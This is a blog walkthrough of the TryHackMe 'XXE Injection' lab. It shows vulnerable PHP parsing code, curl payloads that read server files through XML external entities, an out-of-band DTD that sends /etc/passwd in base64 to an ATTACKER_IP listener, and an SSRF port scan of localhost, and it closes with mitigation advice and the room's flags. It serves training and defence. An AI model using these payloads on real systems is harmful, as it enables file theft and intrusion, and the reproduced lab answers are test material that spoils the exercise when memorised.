---
title: "TryHackMe XXE Injection: File Read, SSRF, and Exfiltration"
date: 2026-10-15T20:01:00+05:30
lastmod: 2026-10-15T20:01:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-xxe/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Injection Attacks
  - XXE
  - XML External Entity
  - SSRF
  - Out-of-band
  - File Disclosure

draft: false
description: "Walkthrough of TryHackMe XXE Injection: in-band XML External Entity file read, SSRF port scanning through the parser, and out-of-band DTD exfiltration."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|XXE Injection |![XXE Injection room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1718412174374)|

XXE Injection sits in the Injection Attacks module of the Web Application Pentesting path, one room over from the SQL and NoSQL work. If you have been through [NoSQL Injection](/post/thm-room-nosqlinjectiontutorial/) and [Advanced SQL Injection](/post/thm-room-advancedsqlinjection/), the shape is familiar: untrusted input reaches a parser that does more than you want. Here the parser is an XML parser, and the extra power is the external entity, which turns a contact form into a file-read, a port scanner, and an exfiltration channel.

The target is a file-sharing app called EasyShare. It was reachable directly over the TryHackMe VPN, so I solved the room with `curl` from my own machine, no AttackBox and no Burp. The lab IP was `10.49.172.204` for my session; substitute your own.

## Task 1 to 3: XML, DTDs, and parsers

The reading tasks build the vocabulary. XML grew out of **Standard Generalized Markup Language** (SGML), and the grammar that defines a document's allowed structure is the **Document Type Definition** (DTD). The DTD is where entities are declared, and an external entity in a DTD is the whole vulnerability.

Task 3 covers parsers. The one that builds the entire document into a memory tree and allows random access to every node is the **DOM Parser**. That matters because a DOM-style parser that resolves external entities will happily dereference a `file://` or `http://` entity while building the tree.

## Task 4: in-band XXE to read a server-side file

The contact form posts an XML body to `contact_submit.php`. The vulnerable code reads the raw request body, parses it with entity loading enabled, and echoes the `<name>` element straight back:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
$expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
echo "Thank you, " . $expandedContent . "! Your message has been received.";
```

`LIBXML_NOENT` expands entities and the `<name>` value is reflected, so this is textbook **In-Band XXE**: declare an external entity pointing at a file, reference it inside `<name>`, and the file content comes back in the response. I always prove the primitive with a plain-text control first (`/etc/hostname`), then read the target file in `/opt`.

```bash
  # control: confirm the primitive resolves file:// at all
curl -s -X POST http://$T/contact_submit.php -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<contact><name>&xxe;</name><email>a@a.c</email><subject>s</subject><message>m</message></contact>'
  # then swap the resource for the flag file in /opt
```

![In-band XXE reading etc hostname as a control then the /opt flag file through the name echo](/img/thm-xxe/01-inband.png)

The control returns the box's hostname, which tells me the read works, and the flag file comes back in the same reflection. The content of `/opt/14232d6db2b5fd937aa92e8b3c48d958.txt` is **THM{1N_b4Nd_1$_34sYY}**.

One trap worth repeating: `file://` silently returns empty for any file that contains `<`, `>`, or `&`, because the entity expands into the document and then the parse fails. A blank reflection is far more often a broken parse than a missing file. For source and config files, reach for `php://filter/convert.base64-encode/resource=<path>` instead and decode the result.

{{< ad >}}

## Task 5: out-of-band XXE

When the response does not echo anything back, the same bug still leaks data through a side channel. The **Out-of-Band XXE** play uses a parameter entity in an attacker-hosted DTD: one entity reads the file with a `php://filter`, a second wraps it in an HTTP request back to a listener, and the file content rides out in the query string.

```bash
  # sample.dtd served from the attacker box
  # <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  # <!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
  # %oob;
```

The submitted XML then pulls in the remote DTD with `<!ENTITY % dtd SYSTEM "http://ATTACKER_IP/sample.dtd"> %dtd; %oob;`, and the base64 of the file arrives in your web server log. This task is a demonstration with no separate flag gated behind it; the reading answer is simply the name of the technique, Out-of-Band XXE. On a real target this is the version you fall back to whenever the injected entity is parsed but never reflected.

## Task 6: SSRF through the XML parser

An external entity does not have to be a file. Point it at `http://localhost:<port>/` and the server fetches that URL for you, which is server-side request forgery straight out of the XXE. Because `contact_submit.php` still echoes `<name>`, the internal response comes back in band, so the in-band primitive doubles as an internal port scanner. I looped a small range of ports and watched for a reply that was not the empty default:

```bash
  # reuse the in-band request, varying only the entity target
  # <!ENTITY xxe SYSTEM "http://localhost:81/">  referenced inside <name>
for P in 79 80 81 82 83; do ... ; done
```

![SSRF through XXE scanning localhost ports, port 81 returns the internal application flag](/img/thm-xxe/02-ssrf.png)

Only one port answers with content. The internal application is hosted on port **81**, and its landing page hands back the flag directly: **THM{0O8_xx3!!}**. The service is bound to localhost and never exposed through the VPN, so without the XXE SSRF there is no way to reach it.

## Task 7 and 8: mitigation and conclusion

The fix is to stop the parser resolving external entities at all. In PHP that means leaving `libxml_disable_entity_loader(true)` in place (or using a modern libxml where external entity loading is off by default) and never passing `LIBXML_NOENT | LIBXML_DTDLOAD`. More broadly: disable DTDs, disable external entities, and prefer a hardened parser configuration over trying to filter payloads. Task 8 is the completion acknowledgement.

## Takeaways

Two ideas carry past this lab into real web targets.

- **Any XML sink is three bugs, not one.** The same external-entity primitive reads local files, forges server-side requests, and exfiltrates out of band. When you find XML input anywhere (SOAP endpoints, SAML, SVG uploads, `.docx`/`.xlsx` ingestion, REST APIs that accept `application/xml`), test all three: a `file://` read with a plain-text control, an `http://` entity to an internal address for SSRF, and an external-DTD callback for the blind case.
- **A blind primitive is not a dead primitive.** An empty reflection usually means the parse failed on markup, not that the file is missing, and a parser that returns nothing can still be driven out of band. Keep a control file to tell "broken parse" apart from "no such file", and switch to `php://filter` base64 the moment you need to read anything that contains XML metacharacters.

Room solved 100%: 8 tasks, 11 answers.
